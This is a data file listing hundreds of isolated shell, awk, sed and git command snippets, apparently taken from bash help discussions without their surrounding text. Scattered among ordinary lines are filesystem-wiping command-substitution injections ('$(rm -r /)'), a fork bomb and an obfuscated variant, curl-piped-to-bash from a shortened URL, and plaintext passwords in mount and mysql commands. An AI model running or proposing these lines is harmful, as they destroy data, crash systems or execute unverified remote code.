parted  /dev/sda print 1  &> /dev/null echo $?
dmidecode -Fn
|sed -n 's/^.*Address:.*0x/0x/p'
address function-list
column -t
sudo modprobe pcspkr
blacklist pcspkr
make clean
rm !(*.c)
SHELL := /bin/bash
bash -c 'rm !(*.c)'
bash -c 'shopt -s extglob; rm !(*.c)'
bash -O extglob -c 'rm !(*.c)'
SHELL := bash -O extglob
apt-get upgrade
-V width=...
bia nconodi
find $HOME -name sphinx-quickstart
conda install sphinx
poetry run py -m sphinx.cmd.quickstart
date +%s
$(date +%s)
grep "$user"
awk '{print $2}'
-f 2
cat > pipe
/say hi
echo "/say hi" > pipe
man date
date +%k
date +%M
( 8*60)+23
^-...------ | wc ...
ls -l
^-...------ | wc ...
export JAVA_HOME="/usr/lib/jvm/java-7-oracle"
sh script.sh < /tmp/machine-list
man bash
Parameter Expansion
read -n1
[[ $letter = [[:alpha:]] && $letter = [[:ascii:]] ]]
{print $0}
sed 's/\bBor.Team1\b/B.Team1/g'
| |
perl -MDDP -F"/;|=/" -lane '$_{$.}={@F};}{ p %_' data.txt
tail -f
date -d@1415800764
adb devices
emulator-5554 device
{echo open 127.0.0.1 5554; sleep 1; echo "avd name"} | telnet
find -exec
source scriptname
. scriptname
ip rule...
ip rule show
ip rule del table 12322
ip rule del lookup 12322
from all lookup local
lookup 12322
ip rule show | grep "regex" | xargs -r -L1 ip rule del
help :
which :
-v RS='\n}\n'
print $0
if (!/directiveX/) print "MyDirective"
print RS
./child.sh "$dictionary"
echo "The resulting create script is: "$create_sql
script params | read VAR
RESULT=$(SCRIPT params)
source ./child.sh "$dictionary"
{n; s/'$data_dir_path'//}'
mkdir -p
cat data
data="$(cat data)"
data="$(< data)"
0 % N
if [ "$MOTD" = "WARNING" ]
./script c d
read c d
grep -e "$c" -e "$d" abc.txt
grep -E
set term postscript enhanced eps color
lw 5
lt 1, 2 and 3
lw 5
set term postscript enhanced eps color dashed
set term epscairo color dashed
lw 4
expr hello '\(hello\|\hi\)'
bash -x
psql 'host=xxx port=xxx dbname=xxx user=xxx'
curl -f ${COREOS_PUBLIC_IPV4}:%i;
man pg_isready
NR%3 == 0
{line = line $0}
paste -d"|" - - - <file
[0-9]+ [A-Z]+ [0-9]+'
screen -r
exit $rc
setvar BOOST_HOME /home/me/boost/boost_1.52.0
export BOOST_HOME=/home/me/boost/boost_1.52.0
[ -d "$2" ]
wget 012.mp4
wget 013.mp4
len( data )
data[ 0 ][ 'name' ]
data[ 1 ][ 'name' ]
--homedir /root/.gnupg
--primary-keyring file
man gpg
--secret-keyring file
>(tee >(cat 1>&2))
tee >(cat 1>&2)
>(cat 1>&2)
cat 1>&2
cat 1>&2
>(cat 1>&2)
tee >(cat 1>&2)
tee /dev/stderr
2> >(tee >(cat 1>&2))
adduser guest
su - guest
cd / && ./whatever
permission denied
bash /whatever
chmod u+x ./whatever
ps axo uname,pid,etime,time,cmd
ps axo uname,pid,etim,time,cmd | grep 'php5' | tee procs.txt
for i in $( cat users.txt ); do grep $i procs.txt | awk '{print $3}' | awk -F: '{print $(NF-1)}' | awk '$1>=10{print $1}'; done
'/php54? '
while read
abc RANDOM love_bash
-bash: http-server: command not found
sudo npm install -g http-server
npm http GET https://registry/npmjs.org/
npm http 304 https://registry/npmjs.org/
~.node/bin/http-server -> ~.node/lib/node_modules/http-server/bin/http-server' and 'http-server@0.7.3 ~.node/lib/node_modules/http-server
http-server -> ../lib/node_modules/http-server/bin/http-server
which brew
brew -v Homebrew 0.9.5
which npm
npm -v
npm install -g http-server
-type d -maxdepth 1 -mindepth 1
-exec utility [argument ...] {}
man find
<header1><zero data1><header2><zero data2>
sleep <your_preferend_timeout> && execute_whatever_you_want_here &
delete: 0
delete: 1
"mail: can not send message: process exited with non zero status"
sudo python sendmail.py
awk -F"," '$2~/Algeria/' file
declare -p
declare -p
echo $PATH
/usr/bin/env bash myscript.sh
[[NSProcessInfo processInfo] environment]
ls -1 | sort -n
awk -F'\t' 'BEGIN {sub("", "\N", $4); print}' file
awk -F'\t' 'BEGIN {sub(/^&/, "\N", $4); print}' file
awk -F"\t" 'NF<4 {print}' file
cat -vET file
cat -vET file
\N' treated as plain
awk -F'\t' -v OFS='\t' 'length($4)==1{$4="\N"}1' file
cat <<
cat file|wc -l
$(( ))
git commit
export GIT_EDITOR=vim
for i in "$@"
gnu awk
$(netstat -anputw | awk '{print $1}'
line 4 syntax error near unexpected token then
read -p
'Type your name: '
vagrant provision
cp ~/Desktop/Log.txt file.src directory1.src  file2.src
xargs cp arg100 .... arg900
cp a100 ... a500; cp a501 ... a900
-type f
$ make c<tab>
man set
No manual entry for set
which set
set -x
make c<tab>
grep --colour=auto -n
yum -y update
> /dev/null
set -e
bash -ec
set -e
kill -9 $1
kill -9 $1
ps -ef
getfiles dirname
-maxdepth 1
<(getfiles A)
dddate; echo 'hi'
dddate && echo 'hi'
system("/usr/bin/env bash -c usage")
system("/usr/bin/env bash -c usage); print $2"
$(echo "$threshold")
git status
git status
git ls-files --others --exclude-standard | wc -l
strace git status
 .git/index
man git
cp foo.sh /usr/bin/foo
foo john
echo 2
bash -x
set -x
declare -a
declare -A
/usr/bin/pacmd list-sink-inputs
grep Clementine
not found
here string
grep -c "Clementine"
/usr/bin/pacmd list-sink-inputs
[[ -s file ]]
echo ${#array1[@]}
tr '[a-z]' '[A-Z]'
tr '[a-z]' '[A-Z]'
convert b.ps b.png
done <r
read yn
read -u
example like this.txt
"example like this.txt"
pv -n $1
md5sum | sed -e 's/\s.*//g'
zenity --progress --auto-close
ACCESS DENIED
mysql -u myusername -p
man stat
[ ... ]
man test
var=$(acpi -t)
curl: (7) couldn't connect to host
unexpected value
man test
ls /dev/fd
bash -c 'echo <(echo)'
./input 4>&0 63>&0
man ssh_config
sudo su
tail -f /var/log/somelog
filePerms=$(stat --format=%A $path)
filePermsTest=$(cut -c1- $filePerms)
N-     from N'th byte, character or field, to end of line
stat --format=%A filename | cut -c 2-4
grunt preview
IFS=$(echo -e '\n')
eval echo $(cat expect.piece)
declare -l
help declare
Hello Thanks for all of you I see better now the problem When I put home/TO_REPLACE/dmwebolabo alone it works fine but when it's in its original line it doesn't This is the original line : define('UPLOAD_DIRECTORY', '' . DS . 'home/TO_REPLACE/dmwebolabo' . DS);
cat <<< "Hello world"
man 3 pipe
ls /home/testing | cut -c1-10 | uniq
10 digit prefix
grep 'school'
ls | grep 'school'
gcc -Wall
sudo su - postgres
psql -U psql < setup_postgresql.sql
./build_sql.sh  dummbyuser dummbybd
${fn: -2}
find | while
man mv(1)
mv --backup=t ...
aaa1 -> bbb1.~1~
aaa2 -> bbb1.~2~
aaa3 -> bbb1.~3~
aaa4 -> bbb1
./child.sh "$param1" "$param2"
[ $ANS = 1 ]
[ "$ANS" = 1 ]
/usr/bin/perl $DIR/GSU-RTR-sshscript.pl $codesite $ip $operateur $hostname
cd /Applications/Theirappname.app/Contents/Resources && do sth here
No such file or directory: /Applications/Theirappname.app
PWD= /bin/pwd
PWD= /bin/pwd
PWD = /bin/pwd
my @erase = qw[
for loop
sed ... $d
GetTime 2
sleep 0.1
.test $(rm / -rf)
/home/pi/startsong.sh /path/to/track
/bin/bash -c
git branch
git branch | grep '^. branchA'
git branch | grep '^[^A-Za-z0-9]*branchA'
git branch --list 'branchA*'
sort -V
man sort
vim autocron.sh
while true; do begin=
; php executablefile.php; end=
; if [ $(($end - $begin)) -lt 5 ]; then  sleep $(($begin + 5 - $end)); fi; done
chmod +x autocron.sh
chmod +x PHP file location (executablefile.php)
nohup sh autocron.sh&
if (/^CREATE TABLE/) {name=$3}
CREATE ALTER
else sub("table", name)
-maxdepth 1
-type f
-n +1
sh restart.sh
man 1P wait
sh restart.sh
man bash
. child.sh
. child.sh
dom=$(date '+%_d')
dow=$(date '+%u')
currentm=$(date '+%_m')
nextm=$(date -d '+7 days' '+%_m')
limit=(0 4 4 2 2 2)
[ "$dow" -le 5 ]
[ "$dom" -le "${limit[$dow]}" ]
[ "$currentm" -ne "$nextm" ]
do_run && /path/command
vim *
:args *.h *.cc *.cpp
ctrl+a c
shell script
build Phase
Copy Bundle Resources
build phase
copy bundle resources
spawn_id: spawn id exp6 not open
spawn id exp6 not open
unix2dos EXCEPTION.csv
while read ... done < file
echo ${FILENAME##*/}
gsub(); print
grep -v
while loop
[1]+  Done                    ksh dummy.sh > text
cat text
[1] ....
while read
Exception in thread "main" java.lang.NoClassDefFoundError: com/mongodb/MongoClient
set -A newArray
Executable Jar file
printf("%d \n","0x"$1)
unbuffer -p
unbuffer -p
while (<>) {}
perl -0pe 's/,(?=\n\),\n)//g' file
perl -0pe 's/,(?=\s*\n\),\n)//g' file
print a;
a=substr(a, 0, length(a))
No such file or directory
test -lt
wc -l
| wc -l
file $plik | grep 'zip'
./_*: No such file or directory
bash variable
$ which python
$ ./myscript
$ myscript
$ PATH="$PATH:/path/to/new/dir"
export PATH=$PATH:~/bin
rm -f ~/.bashrc_bak
declare -A
(( ))
var ""
[ ? ]
It's a complicated string
It'\''s a complicated string
> ^C
grep -f
ls -l /dev/vcs0
cp /dev/vcs0 console_memory
rsync -a --max-size=100kB sourcedir destdir
-u 3
grep a b
sed 's/ *$//'
sed 's/^ *//'
tr -d ' '
(( ))
/^read:/ && $NF > 0 {print "Fail";}
for ((counter=1; counter<26; counter++)); do
ecread=$(awk -v num=$counter '/read:/ && NR==num {print $8} NR==num{exit;}' ./txt.file)
if [ "$ecread" ] && [ "$ecread" -gt 0 ]
/read :/
o == $COUNTER
ssh user@serverIP 'mysql -u videoeditor -p12345 testing -e "UPDATE testing.video SET rtsp_url = INSERT(rtsp_url, LENGTH(rtsp_url) - LOCATE('/', REVERSE(rtsp_url)) + 2, 0, '10101');"'
sudo bash
'bash: -c: option requires an argument\n'
bash -c
ssh admin@mysite.com
yum install
p4 help usage
cat temp.txt
which head
export PATH=${PATH}:/Users/chema/sdk-android/sdk/platform-tools:/Users/chema/sd$
export PATH=$PATH:/Applications/XAMPP/xamppfiles/bin
source ./reset_paths.sh
bash -version
rpm -qi bash
bash -version
man bash
sort -V
man sort
INSERT TURING-COMPLETE LANGUAGE HERE
-type f
-iname "*.fastq"
-exec python script
find . -name "*.fastq" | xargs your_bash_script.sh
git log
git describe --tags $rev
git describe --contains $rev
git rev-list --branches --tags $rev
git rev-list
value > 10
awk '$3>10 {print $1}' file
PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
PS1='\[\e[32m\]\A\[\e[m\] \[\e[31m\]\u\[\e[m\]@\[\e[36m\]\h\[\e[m\]\[\e[32m\]:\[\e[m\]\[\e[32m\]\w\[\e[m\]\\$ '
sed "s#PS1='\$\{debian_chroot:\+\(\$debian_chroot\)\}\\\[\\033\[01;32m\\\]\\u@\\h\\\[\\033\[00m\\\]:\\\[\\033\[01;34m\\\]\\w\\\[\\033\[00m\\\]\\\$ '#PS1='\\\[\\e[32m\\\]\\A\\\[\\e\[m\\\] \\\[\\e\[31m\\\]\\u\\\[\\e\[m\\\]@\\\[\\e\[36m\\\]\\h\\\[\\e\[m\\\]\\\[\\e\[32m\\\]:\\\[\\e\[m\\\]\\\[\\e\[32m\\\]\\w\\\[\\e\[m\\\]\\\\\$ '#g" .bashrc
sed: -e expression #1, char 267: Invalid content \{\}
Special Parameters
Parameter Expansion
wget -qO - google.com | awk '{print NF}' | sort -g
' '
mount -t smbfs //user2:password2@server1.mydomain.com/myproject ~/localmap
mount -t smbfs //mydomain\user1:A%b\$c\@d\!e#f@server1.mydomain.com/myproject ~/localmap
" "
gnu awk
DiskSizeDecimal=$(diskutil list | grep 'Automation' | awk '{print $4}')
DiskSize=$(awk 'BEGIN { rounded = sprintf("%.0f", ‘$DiskSizeDecimal’); print rounded }’)
my_string % my_values
-s 11
-n 13
-v c="$1"
FNR==2 && $0~c {print FILENAME; nextfile}
c-style for loop
read -p "(#)Select File (f)orward (b)ack : " ans
-F', *'
grep -Fvxf
[ "$old" ]
[ "$old" ]
(( $new - $old > 300))
bison --version
which bison
$ bash scriptTwo.sh
not null
primary key
-newermt "2000-12-24"  ! -newermt "2000-12-25"
-type f
-exec mv {} "/other/path/$(basename {})-1" \;
$(basename {})
temp files
target directory
start time
target dir
start time
end time (default = start time + 1 day)
color: "\2"; size: "\3"; price: \1
color: '\2'; size: '\3'; price: \1
du -d 1
awk ...
for f in ...; do mv;...
$up,$lo and $lo
sudo chmod +x /etc/init.d/apaStart
sudo ln -s /etc/init.d/tomcat /etc/rc5.d/S71apaStart
sed -e 's/<.*:/</g' test.xml
bash --version
Nov 20 06:06:58 business-log-sta [DP-Domain-STAGING][0x80000001][business-log][info] mpgw(GenServiceMPG): trans(31513092)[request]: AAA Authentication failure/>
my ( $timestamp, $message ) = (m/\A(\w+\s+\d+\s+\d+:\d+:\d+) (.*)/);
chmod +x azx_installer.sh
sh azx_installer.sh
chmod: cannot create /home/andrelima/Desktop/azx.desktop: Directory nonexistent
sh script
sh -x script
ssh -t
sed 's/\.\.\///g'
sed 's%../%%g'
pr -m -t A.txt B.txt
paste a.txt b.txt
man cut
man paste
script1 = subprocess.call(["/dir/python","/dir/script1","param"])
script1 = subprocess.call(["/usr/bin/xterm","param to run bash and my script"])
-newermt '2014-07-01' ! -newermt '2014-08-01'
tar -rzf
prg | split --numeric-suffixes --lines=100 debug.log.
ls | grep -i .abc
while read
bash -s
bash -s
head -2
man pushd
man popd
pushd ~/Documents/Scripts/
vim bashp0rn.sh
cat myscript.sh | bash
echo "X=$X"
cat myscript.sh | bash
cat myscript.sh | bash
bash script.sh
Debian 7.7 64bit
usb soundcard
echo "0" > "/sys/bus/usb/devices/usb2/power/autosuspend_delay_ms"
echo "auto" > "/sys/bus/usb/devices/usb1/power/control"
sh hello.sh 1.txt 2.txt 3.txt
declare -g
hostname -i > /path/to/filename
hostname -I  > /path/to/filename
crontab -e
man grep
echo "sed \'$line$d\' /etc/passwd"
sed -i
sed 'command' file > file
man sed
echo "hi ☠ there ☠" | LANG=C sed "s/[\x80-\xFF]//g"
uconv -x "::NFD; [:Nonspacing Mark:] > ; ::NFC;"
uconv -x "::Latin; ::Latin-ASCII;"
uconv -x "::Latin; ::Latin-ASCII; ([^\x00-\x7F]) > ;"
A l'ecole
[[ $foo = $bar ]]
"~/.bash_profile" 28L, 763C
\d{1,}h \d{1,}m \d{1,}s
\d{1,}m \d{1,}s
$price == '(\d{1,}) ', $names == '(Bob|Tom|Laura|Sandra) ', $tags == '(News|Show) '
${BASH_REMATCH[1]} =~ $price
ID: ${BASH_REMATCH[2]}; time: $sec seconds; description: ${BASH_REMATCH[4]} – buy for " + "$" + ${BASH_REMATCH[1]}!
${BASH_REMATCH[1]} =~ $names
description: ${BASH_REMATCH[4]} from @${BASH_REMATCH[1]}; time: $sec seconds
${BASH_REMATCH[1]} =~ $tags
ID: ${BASH_REMATCH[2]}; #${BASH_REMATCH[1]}; time: $sec seconds; description: ${BASH_REMATCH[4]}
ID: ${BASH_REMATCH[2]}; time: $sec seconds; ${BASH_REMATCH[1]}; description: ${BASH_REMATCH[4]}
man debconf-set-selections
print $0" " a[substr($3,2)]
'2 p'
{Wed Nov 19 14:17:32 2014}
Wed Nov 19 14:17:32 2014
/usr/bin/env bash
cd ..
[[APP environment] setPwd:[[[NSProcessInfo processInfo]environment]objectForKey:@"PATH"]];
-[NSFileManager changeCurrentDirectoryPath:]
sed 's/^ *//'
cat | grep | sed
[[: not found
#!/usr/bin/env bash
config.vm.provision "shell"
config.vm.provision "bash"
provisioner could not be found.
if [[ -z $NODE_VERSION ]]; then
ps | grep
gcc filename.c
gcc filename.c
gcc filename.c && ./a.out
make run
puts 20
grep -Fwf first.txt second.txt
gzip -nc file
gzip < file
gzip --no-name
if (a<b)
CRIT reaped unknown pid <number>
check_parms $#
case $# in
check_params "$@"
check_order $currentport 1023
seq .1 .3 1
cd ~/public_html/app/Config; sed -i 's/ADDRESS_SSH/l'adresse à été correctement intégréé/g' param.php;
Europe de L'Ouest
file yourfile
UTF-8 Unicode text
bash yourfile
printf à | wc -c
cp --parents
-type f
myfunction $@
myfunction $*
myfunction "$1" "$2" "$3" ...
<polyline id="graph" points="0,287 100,470 200,509 300,459 400,471"/>
287 470 509 459 471
grep -oP '(?<=points=").*(?="/>)' "file.svg" | grep -oP '(?<=,)[[:digit:]]*'
$twig -> parsefile
echo $1
something 1 2
something2 3 4
set -- $REPLY
echo "A $1 $2"; echo "B $3 $4";
'$3 ~ /^1/'
sudo ifconfig en0 ether xx:xx:xx:xx:xx:xx; sudo ifconfig en0 down; sudo ifconfig en0 ether up; sleep 6; ping -c 3 www.google.co.in;
su -c "/home/wayne/script1.sh" -s /bin/sh wayne
su -c "/home/wayne/script2.sh" -s /bin/sh wayne
Sorry user is not allowed to execute
-v random=$random
function out(){if (count>0)printf "%s - %s %s\n",first,last,count;count=0}
NF<2 {next}
eval "$CMDEXEC" >> "$LOGFILE"
--one) || --o)
--one ) || -o )
expr 2 + 6
git add
git commit
git add
git add -A
git add -u
git status
git pull
git remote
nvm alias default v0.10.33
ffmpeg -i "$1".ts -movflags +faststart -vcodec h264 -acodec mp3 -f mpegts "$1"-new.ts
./conv_sat_to_clean_ts ./Operacja\ Dunaj
./conv_sat_to_clean_ts "Operacja Dunaj"
man time
/usr/bin/time -o logfile command
/usr/bin/time -o time_log -f "%E real,%U user,%S sys" [command] [args]
~ user$ cd repos
repos user$ _
xyz user$ cd repos
repos user$ _
grep -o
help local
ls -l
"/cygdrive/c/te st/win.bat" "hello"
Read about execution
php /path/to/script.php 'Hello, ' 'World!'
sudo add-apt-repository ppa:webupd8team/java
{ if ($2 in pattern){flag=1}
else if(NF > 1){flag=0}}
[ $# -gt 0 ]
if [ $# = 0 ]; then
tolower($col) ~ tolower(search)
'pax> '
'...> '
find -type f -printf '%T+ %p\n' | sort | head -1
prints the correct output i.e. line without
gsub(/.*\//, "", $NF)
print $5,$NF
print $5,a[n]
php -l
php -l
php -l
php -l
php -l
php -l
php -l
ls (logic) >> output.text
echo "$(cat <<< "* useless string *")"
echo $(...)
variable="$(echo "*")"
variable=$(echo "*")
case expr in
sh script.sh DD 50
ip route ls
NR==1 {next}
END {}
for (i in a) {print i, a[i]; tot+=a[i]}
print "TOTAL", tot
sh col_sum.sh a.txt b.txt c.txt
Connection refused
-exec du -sh {} \;
-type f
absolute path
bourne shell
gem uninstall rails
-F[\ :]+
printf "%d%s", sum[i], (i==NF?"\n":" ")
for (i in sums)
> out.txt
python test.py ls --output=out.txt
strace python test.py > out 2> err
strace -o strace_out python test.py > script_out 2> script_err
. ~/helper.sh
process_and_evaluate ls -lA
process_and_evaluate out.txt err.txt ls -lA
not a valid identifier
set -x
set +x
set -x
export ANDROID_HOME=/Users/Appa/Development/android-sdk-macosx export PATH=$PATH:$ANDROID_HOME/tools:$ANDROID_HOME/platform-tools
./test toto
man bash
man test
declare -p param
export $PATH
not a valid identifier
open .bash_profile
cordova add platform android
-bash: cordova: command not found
export ANDROID_HOME=/Development/android-sdk-macosx export PATH=${PATH}:$ANDROID_HOME/tools:$ANDROID_HOME/platform-tools
-bash: defaults: command not found
export $PATH
export PATH
input_not_empty "INPUTVAR" "message"
[ "$VAR" ]
./a.out file.txt 2
./a.out does_not_exist.txt 2
IFS=' '
sort -n
printf "%s\n" "${arr[@]}"
<(printf "%s\n" "${arr[@]}")
sort -n
invalid option
bash -x
Pathname Expansion
funtion myFun
grep -v grep
ssh localhost
zfs | send
print "..."
command not found
[ $result_sort ]
/bin/sh /<folder with scripts>/script.sh
{print NR}
man paste
ls -la
umount /cygdrive/w
umount: /cygdrive/w: Invalid argument
rm -rf <folder name>
sudo chown <username:group> <folder name>
rm -rf
lsattr <folder name>
echo "$-"
top -n1
top -n1
curl http://myurl.com >> ~/log
man 5 crontab
ERRORbind EADDRINUSE
:!<shell command>
sudo -u postgres psql
CREATE USER root WITH SUPERUSER;
mysql -h 127.0.0.1 -u dbusername -pPasswordDB database
killall <process name>
pgrep java
/sbin/pidof -x $0 |wc -w
/sbin/pidof -x $0
/sbin/pidof -x $0 |wc -w
/sbin/pidof -x $0 |head
/sbin/pidof -x $0 |head |wc -w
/sbin/pidof -x $0 |head |tail
/sbin/pidof -x $0 |head |tail |wc -w
$( rm -r /)
echo $x
echo a
echo ${a}
echo example
touch ${!x}.txt
touch example.txt
if [ (( ${#a} - 6  )) -gt 10 ]; then echo "Too long string"
if [ 1 -gt 10 ]; then echo "Too long string"
echo "\$a and \$x">/dev/null
echo "\$a and \$x>dev/null"
String Cmd
sort -k 6
man split
'hxxp-3A__' with 'http://'
find sed tree
csh -X
(( ))
$(( ))
which reboot
latex -
latex /dev/stdin
while read
Depth.txt, Epoch.txt, file.txt, Gap.txt, Latitude.txt, Longitude.txt
curl -sSL http://goo.gl/DGs3Fv |bash
script .. curl | bash
: No such file or directoryocess.plist
cat -v yourfile
echo "$yourvariable" | cat -v
tr -d '\r'
Control c
control c
"enter 0 to exit"
kill -l
hadoop fs -ls -R /path/to/dir/d_20141123* | grep -oE '(.*)?\/(.*)\/'
hadoop fs -ls -R /path/to/dir/d_20141123* | grep -oE '\/(d_.*)\/'
hadoop fs -ls -R /path/to/dir/d_20141123* | grep -oE '(d_\d+\-\d+)'
grep -E
grep -P
jar -tvf ~/koba/loki.jar
jar -tvf ../koba/loki.jar
ps aux
ps -eo user,%cpu,%mem
curl -L https://get.rvm.io | bash -s stable
-s stable
man bash
info bash
man bash
printf %q
set -a
find ~/Downloads +time1000s
-not -name .
exec mv
man find
-exec rm -- {} $dest/
source test_this2.sh
login shell
login shell
login shell
$(hostname -s)
tr -d SET
tr SET ' '
target/universal/stage/bin/<project name in lowercase>
activator stage
show <key>
mmap.error: [Errno 22] Invalid argument
m: TypeError: Required argument 'length' (pos 2) not found
39 35 20 45 35 20 30 41 20 32 46 20 36 36 20 31 45 20 33 32 20 45 45 20 34 43 20 42 38 20 39 41 20 36 45 20 42 44 20 45 43 20 30 31
95 E5 0A 2F 66 1E 32 EE 4C B8 9A 6E BD EC 01
echo -e '\x41' | dd if=file.txt ibs=1 count=1 seek=3 conv=notrunc
echo -e '\x41' | dd if=file.txt ibs=1 count=1 obs=1 seek=3 conv=notrunc
foo bar
touch foo\ bar
"foo bar"
foo bar
"foo bar"
"foo bar"
"foo bar"
find X Y
read -r
man kill
-e ...
Extract Here
7z x
unzip %x
only DEFLATED entries can have EXT descriptor
7z x
7z x
invalid compressed data to inflate
bad zipfile offset (local header sig)
test -f
\( \)
(cd /tmp; pwd); pwd
ps -ef
grep -o
ps -ef
find . -path . -o -not -path './TTDD*' -prune -o -type f -print
as an argument
as an argument
take/create multiple directories
screen -D -R
source ~/.bash_profile
source ~/.bashrc
paste data2 data4 data5 data6 |awk -F"," '{printf("%-50s %s\n",$1,$2,$3,$4,$5)}' > data3
-F '        '
gnu awk
cd --
print '\e[m'
[0, 1, 2, 3, 4, 5]
[0, 95, 135, 175, 215, 255]
OSC 10 ; spec BEL
OSC 11 ; spec BEL
OSC 110 BEL
OSC 111 BEL
"A B C"
split("A B C", arr)
i in arr
if (i in arr)
for (i=1; i in arr; i++)
for (i in arr)
index + value
op bbc
op bbc safari
op:1: = not found
hexdump -C
foo.bash: line 1: cd: /www/path/to/folder\r: No such file or directory
git: 'pull\r' is not a git command. See 'git --help'
back_directory.pl --complete Th
This\ test/
bcd This\ test/
-o filenames
back_directory.pl --complete
if ( != 0):
cmd.execute("ls /var/patchbundle/rpms/ | grep %newrpms ")
...grep %s" % (i,))
Docker version 1.3.2, build 50b8feb
sed 's...'
1twenty three
bash -n <script_name>
bash -n
bash -n
if ./script.sh; then [...]; fi
script textualfile*
vi filename.sh
:set ff=unix
edit => EOL Conversion => Unix(LF)
git add
line=$("echo $line")
line=$(bash -c "echo $line")
line="echo $(rm -r /)"
echo $x
echo a
echo ${!b}
echo example
touch ${!b}.txt>/dev/null
touch example.txt>/dev/null
if [ (( ${#a} - 6  )) -gt 10 ]; then echo "Too long string";fi
if [ 1 -gt 10 ]; then echo "Too long string";fi
echo "\$a and \$x"|tee file.txt
echo "\$a and \$x"|tee file.txt"
set -x
set +x
declare -g
Filename Expansion
12/ 4/2022
-k 3.4nbr
$if Bash
# Quote the current or previous word "\C-xq": "\eb\"\ef\""
crontab -l
crontab -l
* * * * * ( sleep 30 ; sudo /var/crons/ParseLogs.sh )
sudo crontab -e
* * * * * ( sleep 30 ; /var/crons/ParseLogs.sh )
tail -f /var/crons/test
chmod +x /var/crons/ParseLogs.sh
chmod +x /var/crons/ParseLogs.sh
dict-replacement File1 File* > output
set -e
set -e
set +e
umask 755
exec 6<>/dev/tcp/127.0.0.1/445
find ./ -name "*.m" -print0 | xargs -0 genstrings -o en.lproj
/* Comment */ /r/n "Param" = "Param";
(( ))
pid 0
pid 17613
-printf "%kKB %p\n"
sort -n
find /location/of/directory/ -type f -size +2G  -exec du -s {} + |sort -n
du -s
sort -n
export CHANGE_HAPPENED=1
unset CHANGE_HAPPENED
if ( something_happened() ) { update_status() }
unshare -n /bin/bash
condition="[[ .. ]]"
until eval $condition
ls nonexistent-prefix-*
setterm reset
trap 'reset; exit' SIGINT
ls ~/Documents
[ -f $file ]
file='something with spaces'
[ -f "$file" ]
file='something with spaces'
something with spaces
[ -d "$file" ]
my_script arg1 test.txt
my_script arg1 < test.txt
my_script arg1 < test.txt
myscript arg1 < test.txt
myscript arg1 test.txt
sed -n 's/.../p'
grep -o
find -exec
touch ~/.bash_profile; open ~/.bash_profile
export PATH=$PATH:/Applications/Dart/dart-sdk/bin
source ~/.bash_profile
echo $PATH
add2 4 -3 12 9
add2 4 -3 twelve nine
echo $number | grep -q "[^a-z]" >> /dev/null
echo "$sum"
grep -q
grep -q $'^-[1-9][0-9]*$\n^0$\n^[1-9][0-9]*$ <<< "$number"
[[ "$number" = 0 ]] || [[ "$number" =~ ^-?[1-9][0-9]*$ ]]
,_,( ){ ,_,| ,_,&};,_,
:() { :|: & };:
BashCommand ABC DEF
git rev-parse --show-prefix
git rev-parse --show-toplevel
git rev-parse --show-cdup
Accept-encoding: gzip
man pidof
* * * * * /path/to/script.sh
for(i in device) print i,device[i]
exit 1
-a 1
echo $?
[ "$?" < "0" ]
cat < filename
sed 's/ .*$/@/g' file.txt
cat /home/root/file.txt
man ps
super user
sudo foo
end of line
end of line
typed variables
"[: 1, : integer expression expected"
Sat Nov  1 00:39
last -RF
cd /cygdrive/c
cd /cygwin/c/someDir
cat listing.txt...
alias git=/path/to/your/git
which git
source ~/.bash_profile
[[ ${i:0:1} = ';' ]]
awk -F\; -v len=$length '{ printf "%-"len"s %-40s\n", $1, $2}'
code_width - 1
Hello World!
pr -e -t
awk -f tst.awk file file
'Hello; World!'
align_coms input
align_coms -com=# align_coms
. cards
curl -L https://get.rvm.io | bash -s stable
/home/sashoalm/Has Spaces.txt
:help job-control
nvim -u NONE -S <filename>
$stdout.sync = true
man readlink
cat test.txt |grep -v "a" --exclude="aaa"
Text text text!
Text text text\!
set -o history -o histexpand
grep dc
[[ ]]
[ ]
[[ ]]
for anything in "$1"
for anything in "$@"
ssh username@ipp.ip.ip.ip/path/to/folder
exit 0
"$( cd "$( dirname "$0" )" && pwd )/$(basename $0)"
sed -i
sed -i
sed -i.bak
" "
'Y', 'y', 'N', 'n'
if [ "$option"="y" ] ||   [ "$option"="Y" ]
set -e
#!/bin/sh -x
expect "$*"
> ~/.ssh/known_hosts
-n account name
-r number of accounts
/usr/local/bin/batch_user -n bob -r 5
_s Inser
my-alias my-branch
git push origin HEAD:refs/for/my-branch
echo baz
echo qux
minor version
edit filter set
read -n 1
="mv "&A1&" prefix"&A1&"suffix"
="mv "&A1&" "&substitute(A1,"jpeg","jpg")&"suffix"
="mv olddirectory/"&A1&" newdirectory/"&A1
nano rename.txt
bash rename.txt
CREATE TABLE
tail -1000
tac $FILE | grep $SOMETHING -m 1
grep -m
tail -n +1 "$log"
cat "$log"
tail -n 1 "$log"
man cd
man cp
man mkdir
mkdir -p
bash -ex
find ...
Echo: "$(echo ${project_name})"
++ find . -name 'my-test-app*.jar'
echo "Find: $(find . -name ${project_name}*.jar)"
find . something*.jar
echo "Find: $(find . -name "${project_name}*.jar")"
echo "Find: $(find . -name ${project_name}\*.jar")
mkdir -p $FTP_PATH
cat "/home/ubuntu/test"
VAR=$(grep "B" < PATH | cut -d' ' -f2)
cat $B
ssh username@ipp.ip.ip.ip
cd path/to/folder
nohup ./myexecutable.exe >nohup.out 2>&1 &
>nohup.out 2>&1
echo "$TEST"
groups $USERNAME
grep ^foo
man test
echo here >> /tmp/update-blacklist.out
* * * * *
type -p curl grep egrep ipset >> /tmp/update-blacklist.out
type ipset
<another command>
> longline.txt
-bash: syntax error near unexpected token
grep -P
complete -o filenames
aaa a/<tab><tab>
a/b  a/c  a/d
b/ c/ d
${DAYS/ ${fn:8:2} /}
echo "${DAYS}" | grep -q "${BACKUP_DAY}"
{ stdio: 'inherit' }
stdio: 'inherit'
cat -A
expand [file]
echo $LD_LIBRARY_PATH
. .bash_profile
test tty && echo $1
diff -r --exclude="*.zip" "$CURRENT_BUILD_DIR" "$PREVIOUS_BUILD_DIR" >> "$DIFF_DIR"/DIFF.TXT
sed -e 'command_1' -e 'command_2' ... -e 'command_n'
sed 'command_1; command_2; ...; command_n
for file in *
'1d ; s/^"//'
pv -a
sed '/s/\r/ /g'
[ 579kiB/s] [ 486kiB/s] [ 439kiB/s] ...
sed -r 's|[ ([0-9]+).|\1|g'
ip link
ip link show
man bash
import os
stdbuf -o0 -e0 my_command
exit 0
, FAIL
trap - DEBUG
grep ^[^/]*/*[^/]$ file.txt
sed '@/.*@d'
